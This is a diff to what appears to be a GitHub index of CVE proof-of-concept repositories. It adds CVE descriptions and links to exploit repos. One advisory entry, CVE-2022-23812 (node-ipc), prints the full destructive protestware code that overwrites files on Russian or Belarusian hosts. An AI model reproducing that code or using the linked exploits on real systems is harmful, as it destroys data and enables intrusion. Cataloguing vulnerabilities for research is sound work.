@@ -1703,6 +1703,9 @@
 - [overgrowncarrot1/CVE-2023-24078](https://github.com/overgrowncarrot1/CVE-2023-24078)
 - [rio128128/CVE-2023-24078](https://github.com/rio128128/CVE-2023-24078)
 
+### CVE-2023-24100
+- [badboycxcc/CVE-2023-24100](https://github.com/badboycxcc/CVE-2023-24100)
+
 ### CVE-2023-24317 (2023-02-23)
 
 <code>Judging Management System 1.0 was discovered to contain an arbitrary file upload vulnerability via the component edit_organizer.php.
@@ -5581,6 +5584,8 @@
 </code>
 
 - [Crusaders-of-Rust/CVE-2022-0185](https://github.com/Crusaders-of-Rust/CVE-2022-0185)
+- [discordianfish/cve-2022-0185-crash-poc](https://github.com/discordianfish/cve-2022-0185-crash-poc)
+- [khaclep007/CVE-2022-0185](https://github.com/khaclep007/CVE-2022-0185)
 - [chenaotian/CVE-2022-0185](https://github.com/chenaotian/CVE-2022-0185)
 - [shahparkhan/cve-2022-0185](https://github.com/shahparkhan/cve-2022-0185)
 - [veritas501/CVE-2022-0185-PipeVersion](https://github.com/veritas501/CVE-2022-0185-PipeVersion)
@@ -5614,6 +5619,13 @@
 </code>
 
 - [KTN1990/CVE-2022-0316_wordpress_multiple_themes_exploit](https://github.com/KTN1990/CVE-2022-0316_wordpress_multiple_themes_exploit)
+
+### CVE-2022-0332 (2022-01-25)
+
+<code>A flaw was found in Moodle in versions 3.11 to 3.11.4. An SQL injection risk was identified in the h5p activity web service responsible for fetching user attempt data.
+</code>
+
+- [numanturle/CVE-2022-0332](https://github.com/numanturle/CVE-2022-0332)
 
 ### CVE-2022-0337 (2023-01-02)
 
@@ -6757,6 +6769,15 @@
 
 - [sumeetIT/CVE-2022-20607](https://github.com/sumeetIT/CVE-2022-20607)
 
+### CVE-2022-20699 (2022-02-10)
+
+<code>Multiple vulnerabilities in Cisco Small Business RV160, RV260, RV340, and RV345 Series Routers could allow an attacker to do any of the following: Execute arbitrary code Elevate privileges Execute arbitrary commands Bypass authentication and authorization protections Fetch and run unsigned software Cause denial of service (DoS) For more information about these vulnerabilities, see the Details section of this advisory.
+</code>
+
+- [Audiobahn/CVE-2022-20699](https://github.com/Audiobahn/CVE-2022-20699)
+- [puckiestyle/CVE-2022-20699](https://github.com/puckiestyle/CVE-2022-20699)
+- [rohankumardubey/CVE-2022-20699](https://github.com/rohankumardubey/CVE-2022-20699)
+
 ### CVE-2022-20829 (2022-06-24)
 
 <code>A vulnerability in the packaging of Cisco Adaptive Security Device Manager (ASDM) images and the validation of those images by Cisco Adaptive Security Appliance (ASA) Software could allow an authenticated, remote attacker with administrative privileges to upload an ASDM image that contains malicious code to a device that is running Cisco ASA Software. This vulnerability is due to insufficient validation of the authenticity of an ASDM image during its installation on a device that is running Cisco ASA Software. An attacker could exploit this vulnerability by installing a crafted ASDM image on the device that is running Cisco ASA Software and then waiting for a targeted user to access that device using ASDM. A successful exploit could allow the attacker to execute arbitrary code on the machine of the targeted user with the privileges of that user on that machine. Notes: To successfully exploit this vulnerability, the attacker must have administrative privileges on the device that is running Cisco ASA Software. Potential targets are limited to users who manage the same device that is running Cisco ASA Software using ASDM. Cisco has released and will release software updates that address this vulnerability.
@@ -6770,6 +6791,13 @@
 </code>
 
 - [CiscoPSIRT/CVE-2022-20866](https://github.com/CiscoPSIRT/CVE-2022-20866)
+
+### CVE-2022-21241 (2022-02-08)
+
+<code>Cross-site scripting vulnerability in CSV+ prior to 0.8.1 allows a remote unauthenticated attacker to inject an arbitrary script or an arbitrary OS command via a specially crafted CSV file that contains HTML a tag.
+</code>
+
+- [satoki/csv-plus_vulnerability](https://github.com/satoki/csv-plus_vulnerability)
 
 ### CVE-2022-21306 (2022-01-19)
 
@@ -6839,6 +6867,7 @@
 </code>
 
 - [TAPESH-TEAM/CVE-2022-21661-WordPress-Core-5.8.2-WP_Query-SQL-Injection](https://github.com/TAPESH-TEAM/CVE-2022-21661-WordPress-Core-5.8.2-WP_Query-SQL-Injection)
+- [purple-WL/wordpress-CVE-2022-21661](https://github.com/purple-WL/wordpress-CVE-2022-21661)
 - [0x4E0x650x6F/Wordpress-cve-CVE-2022-21661](https://github.com/0x4E0x650x6F/Wordpress-cve-CVE-2022-21661)
 - [z92g/CVE-2022-21661](https://github.com/z92g/CVE-2022-21661)
 - [QWERTYisme/CVE-2022-21661](https://github.com/QWERTYisme/CVE-2022-21661)
@@ -6875,6 +6904,13 @@
 
 - [lolin19/CVE-2022-21839-](https://github.com/lolin19/CVE-2022-21839-)
 
+### CVE-2022-21877 (2022-01-11)
+
+<code>Storage Spaces Controller Information Disclosure Vulnerability.
+</code>
+
+- [Big5-sec/cve-2022-21877](https://github.com/Big5-sec/cve-2022-21877)
+
 ### CVE-2022-21881 (2022-01-11)
 
 <code>Windows Kernel Elevation of Privilege Vulnerability. This CVE ID is unique from CVE-2022-21879.
@@ -6887,6 +6923,11 @@
 <code>Win32k Elevation of Privilege Vulnerability. This CVE ID is unique from CVE-2022-21887.
 </code>
 
+- [KaLendsi/CVE-2022-21882](https://github.com/KaLendsi/CVE-2022-21882)
+- [David-Honisch/CVE-2022-21882](https://github.com/David-Honisch/CVE-2022-21882)
+- [L4ys/CVE-2022-21882](https://github.com/L4ys/CVE-2022-21882)
+- [sailay1996/cve-2022-21882-poc](https://github.com/sailay1996/cve-2022-21882-poc)
+- [r1l4-i3pur1l4/CVE-2022-21882](https://github.com/r1l4-i3pur1l4/CVE-2022-21882)
 - [dishfwk/CVE-2022-21882](https://github.com/dishfwk/CVE-2022-21882)
 
 ### CVE-2022-21894 (2022-01-11)
@@ -6906,6 +6947,7 @@
 <code>HTTP Protocol Stack Remote Code Execution Vulnerability.
 </code>
 
+- [corelight/cve-2022-21907](https://github.com/corelight/cve-2022-21907)
 - [mauricelambert/CVE-2022-21907](https://github.com/mauricelambert/CVE-2022-21907)
 - [ZZ-SOCMAP/CVE-2022-21907](https://github.com/ZZ-SOCMAP/CVE-2022-21907)
 - [xiska62314/CVE-2022-21907](https://github.com/xiska62314/CVE-2022-21907)
@@ -6950,6 +6992,13 @@
 </code>
 
 - [u201424348/CVE-2022-21984](https://github.com/u201424348/CVE-2022-21984)
+
+### CVE-2022-21999 (2022-02-09)
+
+<code>Windows Print Spooler Elevation of Privilege Vulnerability
+</code>
+
+- [ly4k/SpoolFool](https://github.com/ly4k/SpoolFool)
 
 ### CVE-2022-22029 (2022-07-12)
 
@@ -7081,12 +7130,40 @@
 
 - [nanopathi/external_expat_AOSP10_r33_CVE-2022-22822toCVE-2022-22827](https://github.com/nanopathi/external_expat_AOSP10_r33_CVE-2022-22822toCVE-2022-22827)
 
+### CVE-2022-22828 (2022-01-27)
+
+<code>An insecure direct object reference for the file-download URL in Synametrics SynaMan before 5.0 allows a remote attacker to access unshared files via a modified base64-encoded filename string.
+</code>
+
+- [videnlabs/CVE-2022-22828](https://github.com/videnlabs/CVE-2022-22828)
+
 ### CVE-2022-22845 (2022-01-09)
 
 <code>QXIP SIPCAPTURE homer-app before 1.4.28 for HOMER 7.x has the same 167f0db2-f83e-4baa-9736-d56064a5b415 JWT secret key across different customers' installations.
 </code>
 
 - [OmriBaso/CVE-2022-22845-Exploit](https://github.com/OmriBaso/CVE-2022-22845-Exploit)
+
+### CVE-2022-22850 (2022-01-26)
+
+<code>A Stored Cross Site Scripting (XSS) vulnerability exists in Sourcecodtester Hospital's Patient Records Management System 1.0 via the description parameter in room_types.
+</code>
+
+- [Sant268/CVE-2022-22850](https://github.com/Sant268/CVE-2022-22850)
+
+### CVE-2022-22851 (2022-01-26)
+
+<code>A Stored Cross Site Scripting (XSS) vulnerability exists in Sourcecodtester Hospital's Patient Records Management System 1.0 via the specialization parameter in doctors.php
+</code>
+
+- [Sant268/CVE-2022-22851](https://github.com/Sant268/CVE-2022-22851)
+
+### CVE-2022-22852 (2022-01-26)
+
+<code>A Stored Cross Site Scripting (XSS) vulnerability exists in Sourcecodtester Hospital's Patient Records Management System 1.0 via the description parameter in room_list.
+</code>
+
+- [Sant268/CVE-2022-22852](https://github.com/Sant268/CVE-2022-22852)
 
 ### CVE-2022-22909 (2022-03-02)
 
@@ -7389,6 +7466,7 @@
 </code>
 
 - [jcarabantes/CVE-2022-23046](https://github.com/jcarabantes/CVE-2022-23046)
+- [dnr6419/CVE-2022-23046](https://github.com/dnr6419/CVE-2022-23046)
 - [hadrian3689/phpipam_1.4.4](https://github.com/hadrian3689/phpipam_1.4.4)
 - [bernauers/CVE-2022-23046](https://github.com/bernauers/CVE-2022-23046)
 
@@ -7400,8 +7478,10 @@
 <code>In the case of instances where the SAML SSO authentication is enabled (non-default), session data can be modified by a malicious actor, because a user login stored in the session was not verified. Malicious unauthenticated actor may exploit this issue to escalate privileges and gain admin access to Zabbix Frontend. To perform the attack, SAML authentication is required to be enabled and the actor has to know the username of Zabbix user (or use the guest account, which is disabled by default).
 </code>
 
+- [qq1549176285/CVE-2022-23131](https://github.com/qq1549176285/CVE-2022-23131)
 - [jweny/CVE-2022-23131](https://github.com/jweny/CVE-2022-23131)
 - [Mr-xn/cve-2022-23131](https://github.com/Mr-xn/cve-2022-23131)
+- [1mxml/CVE-2022-23131](https://github.com/1mxml/CVE-2022-23131)
 - [0tt7/CVE-2022-23131](https://github.com/0tt7/CVE-2022-23131)
 - [zwjjustdoit/cve-2022-23131](https://github.com/zwjjustdoit/cve-2022-23131)
 - [L0ading-x/cve-2022-23131](https://github.com/L0ading-x/cve-2022-23131)
@@ -7475,6 +7555,13 @@
 ### CVE-2022-23361
 - [ViNi0608/CVE-2022-23361](https://github.com/ViNi0608/CVE-2022-23361)
 
+### CVE-2022-23378 (2022-02-09)
+
+<code>A Cross-Site Scripting (XSS) vulnerability exists within the 3.2.2 version of TastyIgniter. The &quot;items%5B0%5D%5Bpath%5D&quot; parameter of a request made to /admin/allergens/edit/1 is vulnerable.
+</code>
+
+- [TheGetch/CVE-2022-23378](https://github.com/TheGetch/CVE-2022-23378)
+
 ### CVE-2022-23529
 - [despossivel/CVE-2022-23529-lab](https://github.com/despossivel/CVE-2022-23529-lab)
 - [aalex954/CVE-2022-23529-Exploration](https://github.com/aalex954/CVE-2022-23529-Exploration)
@@ -7532,6 +7619,13 @@
 - [fbusr/CVE-2022-23779](https://github.com/fbusr/CVE-2022-23779)
 - [Vulnmachines/Zoho_CVE-2022-23779](https://github.com/Vulnmachines/Zoho_CVE-2022-23779)
 
+### CVE-2022-23808 (2022-01-21)
+
+<code>An issue was discovered in phpMyAdmin 5.1 before 5.1.2. An attacker can inject malicious code into aspects of the setup script, which can allow XSS or HTML injection.
+</code>
+
+- [dipakpanchal05/CVE-2022-23808](https://github.com/dipakpanchal05/CVE-2022-23808)
+
 ### CVE-2022-23812 (2022-03-16)
 
 <code>This affects the package node-ipc from 10.1.1 and before 10.1.3. This package contains malicious code, that targets users with IP located in Russia or Belarus, and overwrites their files with a heart emoji. **Note**: from versions 11.0.0 onwards, instead of having malicious code directly in the source of this package, node-ipc imports the peacenotwar package that includes potentially undesired behavior. Malicious Code: **Note:** Don't run it! js import u from &quot;path&quot;; import a from &quot;fs&quot;; import o from &quot;https&quot;; setTimeout(function () { const t = Math.round(Math.random() * 4); if (t &gt; 1) { return; } const n = Buffer.from(&quot;aHR0cHM6Ly9hcGkuaXBnZW9sb2NhdGlvbi5pby9pcGdlbz9hcGlLZXk9YWU1MTFlMTYyNzgyNGE5NjhhYWFhNzU4YTUzMDkxNTQ=&quot;, &quot;base64&quot;); // https://api.ipgeolocation.io/ipgeo?apiKey=ae511e1627824a968aaaa758a5309154 o.get(n.toString(&quot;utf8&quot;), function (t) { t.on(&quot;data&quot;, function (t) { const n = Buffer.from(&quot;Li8=&quot;, &quot;base64&quot;); const o = Buffer.from(&quot;Li4v&quot;, &quot;base64&quot;); const r = Buffer.from(&quot;Li4vLi4v&quot;, &quot;base64&quot;); const f = Buffer.from(&quot;Lw==&quot;, &quot;base64&quot;); const c = Buffer.from(&quot;Y291bnRyeV9uYW1l&quot;, &quot;base64&quot;); const e = Buffer.from(&quot;cnVzc2lh&quot;, &quot;base64&quot;); const i = Buffer.from(&quot;YmVsYXJ1cw==&quot;, &quot;base64&quot;); try { const s = JSON.parse(t.toString(&quot;utf8&quot;)); const u = s[c.toString(&quot;utf8&quot;)].toLowerCase(); const a = u.includes(e.toString(&quot;utf8&quot;)) || u.includes(i.toString(&quot;utf8&quot;)); // checks if country is Russia or Belarus if (a) { h(n.toString(&quot;utf8&quot;)); h(o.toString(&quot;utf8&quot;)); h(r.toString(&quot;utf8&quot;)); h(f.toString(&quot;utf8&quot;)); } } catch (t) {} }); }); }, Math.ceil(Math.random() * 1e3)); async function h(n = &quot;&quot;, o = &quot;&quot;) { if (!a.existsSync(n)) { return; } let r = []; try { r = a.readdirSync(n); } catch (t) {} const f = []; const c = Buffer.from(&quot;4p2k77iP&quot;, &quot;base64&quot;); for (var e = 0; e &lt; r.length; e++) { const i = u.join(n, r[e]); let t = null; try { t = a.lstatSync(i); } catch (t) { continue; } if (t.isDirectory()) { const s = h(i, o); s.length &gt; 0 ? f.push(...s) : null; } else if (i.indexOf(o) &gt;= 0) { try { a.writeFile(i, c.toString(&quot;utf8&quot;), function () {}); // overwrites file with ❤️ } catch (t) {} } } return f; } const ssl = true; export { ssl as default, ssl };
@@ -7575,6 +7669,9 @@
 </code>
 
 - [manuelz120/CVE-2022-23940](https://github.com/manuelz120/CVE-2022-23940)
+
+### CVE-2022-23967
+- [MaherAzzouzi/CVE-2022-23967](https://github.com/MaherAzzouzi/CVE-2022-23967)
 
 ### CVE-2022-23988 (2022-02-28)
 
@@ -7998,7 +8095,15 @@
 - [RobertDra/CVE-2022-25256](https://github.com/RobertDra/CVE-2022-25256)
 
 ### CVE-2022-25257
+- [polling-repo-continua/CVE-2022-25257](https://github.com/polling-repo-continua/CVE-2022-25257)
 - [RobertDra/CVE-2022-25257](https://github.com/RobertDra/CVE-2022-25257)
+
+### CVE-2022-25258 (2022-02-16)
+
+<code>An issue was discovered in drivers/usb/gadget/composite.c in the Linux kernel before 5.16.10. The USB Gadget subsystem lacks certain validation of interface OS descriptor requests (ones with a large array index and ones associated with NULL function pointer retrieval). Memory corruption might occur.
+</code>
+
+- [szymonh/d-os-descriptor](https://github.com/szymonh/d-os-descriptor)
 
 ### CVE-2022-25260 (2022-02-25)
 
@@ -8013,6 +8118,13 @@
 </code>
 
 - [yuriisanin/CVE-2022-25262](https://github.com/yuriisanin/CVE-2022-25262)
+
+### CVE-2022-25265 (2022-02-16)
+
+<code>In the Linux kernel through 5.16.10, certain binary files may have the exec-all attribute if they were built in approximately 2003 (e.g., with GCC 3.2.2 and Linux kernel 2.4.20). This can cause execution of bytes located in supposedly non-executable regions of a file.
+</code>
+
+- [x0reaxeax/exec-prot-bypass](https://github.com/x0reaxeax/exec-prot-bypass)
 
 ### CVE-2022-25313 (2022-02-17)
 
@@ -8043,6 +8155,13 @@
 </code>
 
 - [followboy1999/CVE-2022-25365](https://github.com/followboy1999/CVE-2022-25365)
+
+### CVE-2022-25375 (2022-02-20)
+
+<code>An issue was discovered in drivers/usb/gadget/function/rndis.c in the Linux kernel before 5.16.10. The RNDIS USB gadget lacks validation of the size of the RNDIS_MSG_SET command. Attackers can obtain sensitive information from kernel memory.
+</code>
+
+- [szymonh/rndis-co](https://github.com/szymonh/rndis-co)
 
 ### CVE-2022-25636 (2022-02-21)
 
@@ -17874,6 +17993,13 @@
 </code>
 
 - [defensor/CVE-2021-44736](https://github.com/defensor/CVE-2021-44736)
+
+### CVE-2021-44790 (2021-12-20)
+
+<code>A carefully crafted request body can cause a buffer overflow in the mod_lua multipart parser (r:parsebody() called from Lua scripts). The Apache httpd team is not aware of an exploit for the vulnerabilty though it might be possible to craft one. This issue affects Apache HTTP Server 2.4.51 and earlier.
+</code>
+
+- [nuPacaChi/-CVE-2021-44790](https://github.com/nuPacaChi/-CVE-2021-44790)
 
 ### CVE-2021-44827 (2022-03-04)
 
